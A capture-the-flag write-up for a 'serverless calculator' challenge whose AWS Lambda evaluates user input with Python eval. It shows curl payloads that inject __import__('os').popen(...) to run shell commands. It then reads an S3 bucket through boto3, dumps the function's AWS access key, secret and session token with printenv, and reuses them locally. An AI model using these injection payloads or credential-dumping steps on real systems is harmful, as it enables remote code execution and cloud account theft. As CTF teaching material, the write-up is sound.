# Cloud 9*9
```
Our new serverless calculator can solve any calulation super fast.

** The Cloud security challenges are provided by SEC Consult **
http://3.64.214.139/
```

We're given a link to a page with a serverless calculator:
![](./images/calculator.png)

In the background, the calculator submits a request to `/calc` with a JSON payload of `{"input":"..."}`, and returns us the result of the computation. Though exploring it more reveals that it seems to be evaluating any Python code with `eval`:
```
└─$ curl -s -X POST -H "Content-Type: application/json" -d '{"input":"[]"}' http://3.64.214.139/calc | jq 
{
  "result": []
}

└─$ curl -s -X POST -H "Content-Type: application/json" -d '{"input":"__import__"}' http://3.64.214.139/calc | jq
{
  "errorMessage": "Unable to marshal response: Object of type builtin_function_or_method is not JSON serializable",
  "errorType": "Runtime.MarshalError",
  "requestId": "9ddab3ac-def0-4d1e-8259-2b59afe69415",
  "stackTrace": []
}

└─$ curl -s -X POST -H "Content-Type: application/json" -d '{"input":"__import__()"}' http://3.64.214.139/calc | jq
{
  "errorMessage": "__import__() missing required argument 'name' (pos 1)",
  "errorType": "TypeError",
  "requestId": "0bf1466a-621f-4054-9b7c-5878ed139112",
  "stackTrace": [
    "  File \"/var/task/lambda-function.py\", line 5, in lambda_handler\n    'result' : eval(event['input'])\n",
    "  File \"<string>\", line 1, in <module>\n"
  ]
}
```

Now that we're able to execute anything on the machine, we can investigate what else our lambda function does. Note though that all that we execute must be a single statement (unless we use `exec`) and needs to be serializable to JSON (which things like datetimes aren't):
```
└─$ curl -s -X POST -H "Content-Type: application/json" -d "{\"input\":\"__import__('os').popen('ls').read()\"}" http://3.64.214.139/calc | jq
{
  "result": "lambda-function.py\n"
}

└─$ curl -s -X POST -H "Content-Type: application/json" -d "{\"input\":\"__import__('os').popen('cat lambda-function.py').read()\"}" http://3.64.214.139/calc | jq        
{
  "result": "import json\n\ndef lambda_handler(event, context): \n    return { \n        'result' : eval(event['input'])\n        #flag in nullcon-s3bucket-flag4 ......\n    }"
}
```

The source code hints that we need to get access to `nullcon-s3bucket-flag4` bucket, for which we have two options. We can either use the preinstalled `boto3` (AWS SDK for Python; S3 documentation [here](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/s3.html)) to interact with the bucket, or dump the credentials locally and use them with the `aws` CLI.

Using boto3:
```
└─$ curl -s -X POST -H "Content-Type: application/json" -d "{\"input\":\"[item['Key'] for item in __import__('boto3').client('s3').list_objects(Bucket='nullcon-s3bucket-flag4')['Contents']]\"}" http://3.64.214.139/calc | jq
{
  "result": [
    "flag4.txt"
  ]
}

└─$ curl -s -X POST -H "Content-Type: application/json" -d "{\"input\":\"__import__('boto3').client('s3').get_object(Bucket='nullcon-s3bucket-flag4',Key='flag4.txt')['Body'].read()\"}" http://3.64.214.139/calc | jq
{
  "result": "ENO{L4mbda_make5_yu0_THINK_OF_ENVeryone}"
}
```

Using the AWS CLI, we need to dump the credentials accessible to the lambda function and copy them over to our local machine, and then just download the flag from the bucket with `aws s3`:
```
└─$ curl -s -X POST -H "Content-Type: application/json" -d "{\"input\":\"__import__('os').popen('printenv | grep AWS_').read()\"}" http://3.64.214.139/calc | jq -r .result   
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDwaDGV1LWNlbnRyYWwtMSJGMEQCIB4XPPQjjduJPmR7RWX0c7RlVQNGZX5gsQLm5vp4OEggAiB7UmffUVZY2NTA6cDiny+IWxfJLQojR1QHRPbvkv7P2yqCAwil//////////8BEAAaDDc0MzI5NjMzMDQ0MCIMm9xMf9q7hnnscweqKtYCDp58EhAxc/WP16vvHaIN8P3kkHGG7IGnIxpZT9+AX/Uc7BfTGBowjVjN9rTqFJdQgjd2WGakRT6xU+UYTWAc5Nz5kcl4ELUWv4SuDe5RxCkupE8Xf8iVXMPKnfUZ3EBpWtFYPPYBVih5GXs2QHCn2T8aChtEybZPudCk3ChPrdPc3Oa8K+xfnQbRvuEiyfiKWHI7grPCGH/aX7exYOC5xEoMzZhZXHkxauQnIwd3oAcl2egMLSOUsJoK6uis1L5MaVA98vZWhuV6YRVH0PJhx9RO7OhAvFo6HxfQoSMh/SRHZaO4aZqBFscvWxDeT5wrGAbXr0eHJTIXz+DrSbh8TqguUbjhROrHyZg64IaoiXDPycJQGVLd1NFfN/YNVi8ywtpSq/rdZ9GTRHgL5ZaOrdC66CdRHLjj31fgiwU52zIiTHGwBHcr1/4IPIJzPfnfXSb89pWAMMe645cGOp8BBXGh0ohi4GX6vk6m8K+Y/ijF+uYwqklD0zxZpsvQ2VoVfRvEUf/hMpnaFCX/VzmoPvMWtAqOG5ByzMq7M3U8wan1+q/qGVonm3NQ0Cvocf52Gb2iuTUv5b4Yh+D4FIstxUra1FF8lE8MgLwdnKtUdpSdB9LaIu+At+/8f1272eKIEGIg7Hg9BbtRMTyJDJ/U7taalGILSolRyXEAP35K
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/lambda-calculator
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_LAMBDA_LOG_STREAM_NAME=2022/08/14/[$LATEST]1638eb7728fa45b099328ea77a6028ef
AWS_EXECUTION_ENV=AWS_Lambda_python3.9
AWS_LAMBDA_FUNCTION_NAME=lambda-calculator
AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000
AWS_DEFAULT_REGION=eu-central-1
AWS_SECRET_ACCESS_KEY=7VW28qVhHl/UGnkbMbUaluMda/QQSC/Qyvi0lFvC
AWS_LAMBDA_INITIALIZATION_TYPE=on-demand
AWS_REGION=eu-central-1
AWS_ACCESS_KEY_ID=ASIA22D7J5LEL25ZWZ7A
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.129
_AWS_XRAY_DAEMON_PORT=2000
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=512

└─$ export AWS_REGION=eu-central-1
└─$ export AWS_ACCESS_KEY_ID=ASIA22D7J5LEL25ZWZ7A
└─$ export AWS_SECRET_ACCESS_KEY=7VW28qVhHl/UGnkbMbUaluMda/QQSC/Qyvi0lFvC
└─$ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDwaDGV1LWNlbnRyYWwtMSJGMEQCIB4XPPQjjduJPmR7RWX0c7RlVQNGZX5gsQLm5vp4OEggAiB7UmffUVZY2NTA6cDiny+IWxfJLQojR1QHRPbvkv7P2yqCAwil//////////8BEAAaDDc0MzI5NjMzMDQ0MCIMm9xMf9q7hnnscweqKtYCDp58EhAxc/WP16vvHaIN8P3kkHGG7IGnIxpZT9+AX/Uc7BfTGBowjVjN9rTqFJdQgjd2WGakRT6xU+UYTWAc5Nz5kcl4ELUWv4SuDe5RxCkupE8Xf8iVXMPKnfUZ3EBpWtFYPPYBVih5GXs2QHCn2T8aChtEybZPudCk3ChPrdPc3Oa8K+xfnQbRvuEiyfiKWHI7grPCGH/aX7exYOC5xEoMzZhZXHkxauQnIwd3oAcl2egMLSOUsJoK6uis1L5MaVA98vZWhuV6YRVH0PJhx9RO7OhAvFo6HxfQoSMh/SRHZaO4aZqBFscvWxDeT5wrGAbXr0eHJTIXz+DrSbh8TqguUbjhROrHyZg64IaoiXDPycJQGVLd1NFfN/YNVi8ywtpSq/rdZ9GTRHgL5ZaOrdC66CdRHLjj31fgiwU52zIiTHGwBHcr1/4IPIJzPfnfXSb89pWAMMe645cGOp8BBXGh0ohi4GX6vk6m8K+Y/ijF+uYwqklD0zxZpsvQ2VoVfRvEUf/hMpnaFCX/VzmoPvMWtAqOG5ByzMq7M3U8wan1+q/qGVonm3NQ0Cvocf52Gb2iuTUv5b4Yh+D4FIstxUra1FF8lE8MgLwdnKtUdpSdB9LaIu+At+/8f1272eKIEGIg7Hg9BbtRMTyJDJ/U7taalGILSolRyXEAP35K

└─$ aws s3 ls s3://nullcon-s3bucket-flag4                                
2022-08-11 23:27:20         40 flag4.txt
                                                                                                                                                                                                                                     
└─$ aws s3 cp s3://nullcon-s3bucket-flag4/flag4.txt /tmp
download: s3://nullcon-s3bucket-flag4/flag4.txt to ../../tmp/flag4.txt
                                                                                                                                                                                                                                     
└─$ cat /tmp/flag4.txt                                                                                                                                                     
ENO{L4mbda_make5_yu0_THINK_OF_ENVeryone}  
```

Flag: `ENO{L4mbda_make5_yu0_THINK_OF_ENVeryone}`